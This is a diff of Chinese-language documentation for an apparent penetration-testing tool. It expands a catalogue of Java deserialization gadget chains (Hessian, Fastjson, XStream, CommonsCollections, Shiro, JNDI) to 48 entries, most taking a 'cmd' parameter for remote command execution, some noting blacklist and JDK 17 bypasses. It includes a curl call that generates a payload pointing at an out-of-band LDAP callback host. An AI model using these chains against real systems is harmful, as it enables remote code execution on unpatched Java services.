@@ -536,7 +536,7 @@ curl -sf -H "Authorization: Bearer $JWT" \
 | `c3p0_wrapperds` | 嵌套反序列化 | ✅ |
 | `c3p0_jndi` | JNDI 触发 | LDAP 触发 |
 
-### 7.7 java-chains 增强链（`jchains_*`，19 条）
+### 7.7 java-chains 增强链（`jchains_*`，48 条）
 
 > java-chains 以 sidecar 内嵌方式运行，监听 `:8011`，无需单独部署。  
 > `jchains_*` 链相比内置链的优势：**直接命令执行**（无需 JNDI），且无 `_tfactory` NPE 问题。
@@ -555,27 +555,88 @@ curl -sf -X POST $OOB_SIDECAR/generate \
   -d '{"chain":"jchains_hessian1_spring","params":{"jndi_url":"ldap://'"$OOB"':1389/'"$TOKEN"'"}}'
 ```
 
-**完整链清单：**
+**完整链清单（48 条）：**
 
-| Chain ID | 协议 | 参数 | 说明 |
-|---|---|---|---|
-| `jchains_hessian1_spring` | Hessian1 | `jndi_url` | Spring JNDI，1526 B |
-| `jchains_hessian1_exec` | Hessian1 | `cmd` | JDK native 直接执行 |
-| `jchains_hessian2_spring` | Hessian2 | `jndi_url` | Spring JNDI，1286 B |
-| `jchains_hessian2_exec` | Hessian2 | `cmd` | JDK native 直接执行 |
-| `jchains_fastjson` / `jchains_fastjson_jndi` | Fastjson | `jndi_url` | JdbcRowSetImpl (≤1.2.47) |
-| `jchains_fastjson_bcel` | Fastjson | `cmd` | BCEL 字节码注入 (≤1.2.24)，返回 JSON |
-| `jchains_xstream` / `jchains_xstream_jndi` | XStream | `jndi_url` | Spring JNDI |
-| `jchains_xstream_exec` | XStream | `cmd` | JDK native 直接执行 |
-| `jchains_shiro_cbc` | Shiro CBC | `cmd` | CB1+TemplatesImpl，返回 base64 cookie |
-| `jchains_cc1` | Java 反序列化 | `cmd` | CommonsCollections K1 |
-| `jchains_cc2` | Java 反序列化 | `cmd` | CommonsCollections K2 |
-| `jchains_cc3` | Java 反序列化 | `cmd` | CommonsCollections K3 |
-| `jchains_cc4` | Java 反序列化 | `cmd` | CommonsCollections K4 |
-| `jchains_cc6` / `jchains_native_cc6` | Java 反序列化 | `cmd` | CommonsCollections K1，1918 B |
-| `jchains_cb1` / `jchains_native_cb1` | Java 反序列化 | `cmd` | CommonsBeanutils1 |
+*Hessian1（8 条）*
 
-**已验证（Docker 容器测试）：**
+| Chain ID | 参数 | 说明 |
+|---|---|---|
+| `jchains_hessian1_spring` | `jndi_url` | Spring JNDI，1526 B ✅ |
+| `jchains_hessian1_spring2` | `jndi_url` | Spring JNDI 变体 |
+| `jchains_hessian1_spring_exec` | `cmd` | Spring 直接执行 |
+| `jchains_hessian1_exec` | `cmd` | JDK native 直接执行 ✅ |
+| `jchains_hessian1_bcel` | `cmd` | BCEL 字节码，绕 Spring 黑名单 |
+| `jchains_hessian1_rome1` | `cmd` | ROME+CB1 二次反序列化 |
+| `jchains_hessian1_rome2` | `cmd` | ROME2+CB1 |
+| `jchains_hessian1_secondary` | `cmd` | SwingLazyValue 二次反序列化绕黑名单 |
+
+*Hessian2（10 条）*
+
+| Chain ID | 参数 | 说明 |
+|---|---|---|
+| `jchains_hessian2_spring` | `jndi_url` | Spring JNDI，1286 B ✅ |
+| `jchains_hessian2_spring2` | `jndi_url` | Spring JNDI 变体 |
+| `jchains_hessian2_spring_exec` | `cmd` | Spring 直接执行 |
+| `jchains_hessian2_exec` | `cmd` | JDK native 直接执行 |
+| `jchains_hessian2_bcel` | `cmd` | BCEL 字节码 |
+| `jchains_hessian2_rome1` | `cmd` | ROME+CB1 |
+| `jchains_hessian2_rome2` | `cmd` | ROME2+CB1 |
+| `jchains_hessian2_secondary` | `cmd` | 二次反序列化绕黑名单 |
+| `jchains_hessian2_tostring_xbean` | `cmd` | XBean toString + EL 触发 |
+| `jchains_hessian2_tostring_jackson` | `cmd` | Jackson toString 链 |
+
+*Fastjson（4 条）*
+
+| Chain ID | 参数 | 说明 |
+|---|---|---|
+| `jchains_fastjson` / `jchains_fastjson_jndi` | `jndi_url` | JdbcRowSetImpl (≤1.2.47) ✅ |
+| `jchains_fastjson_bcel` | `cmd` | BCEL 字节码注入 (≤1.2.24)，返回 JSON ✅ |
+| `jchains_fastjson_c3p0_h2` | `cmd` | C3P0 + H2 JDBC 执行 |
+
+*XStream（3 条）*
+
+| Chain ID | 参数 | 说明 |
+|---|---|---|
+| `jchains_xstream` / `jchains_xstream_jndi` | `jndi_url` | Spring JNDI ✅ |
+| `jchains_xstream_exec` | `cmd` | JDK native 直接执行 |
+
+*Java 原生反序列化（11 条）*
+
+| Chain ID | 参数 | 说明 |
+|---|---|---|
+| `jchains_cc1` | `cmd` | CommonsCollections K1 |
+| `jchains_cc2` | `cmd` | CommonsCollections K2 |
+| `jchains_cc3` | `cmd` | CommonsCollections K3 |
+| `jchains_cc4` | `cmd` | CommonsCollections K4 |
+| `jchains_cc6` / `jchains_native_cc6` | `cmd` | CommonsCollections K1，1918 B ✅ |
+| `jchains_cb1` / `jchains_native_cb1` | `cmd` | CommonsBeanutils1 ✅ |
+| `jchains_native_cb2` | `cmd` | CommonsBeanutils2 |
+| `jchains_native_cb1_jndi` | `jndi_url` | CB1 JNDI 触发 |
+| `jchains_native_jackson` | `cmd` | Jackson 反序列化 |
+| `jchains_native_jdk17_1` | `cmd` | 高版本 JDK 17+ 绕过链1 |
+| `jchains_native_jdk17_2` | `cmd` | 高版本 JDK 17+ 绕过链2 |
+| `jchains_native_c3p0_el` | `jndi_url` | C3P0 EL 注入 |
+| `jchains_native_c3p0_ldap` | `jndi_url` | C3P0 LDAP 触发 |
+| `jchains_native_k1_secondary` | `cmd` | K1 二次反序列化 |
+
+*JNDI ResourceRef（4 条）*
+
+| Chain ID | 参数 | 说明 |
+|---|---|---|
+| `jchains_jndi_tomcat_el` | `cmd` | TomcatEL + BytecodeConvert，最通用 |
+| `jchains_jndi_groovy` | `cmd` | Groovy ScriptEngine |
+| `jchains_jndi_snakeyaml` | `cmd` | SnakeYAML 反序列化 |
+| `jchains_jndi_beanshell` | `cmd` | BeanShell 脚本执行 |
+
+*其他协议（3 条）*
+
+| Chain ID | 参数 | 说明 |
+|---|---|---|
+| `jchains_shiro_cbc` | `cmd` | Shiro CBC，CB1+TemplatesImpl，base64 cookie ✅ |
+| `jchains_h2_jdbc` | `cmd` | H2 JDBC URL 任意代码执行 |
+| `jchains_blazeds_axis2` | `cmd` | BlazeDS Axis2 反序列化 |
+
+**已验证（Docker 容器测试，✅ 标记）：**
 
 | Chain | 大小 | hex 前缀 | 状态 |
 |---|---|---|---|
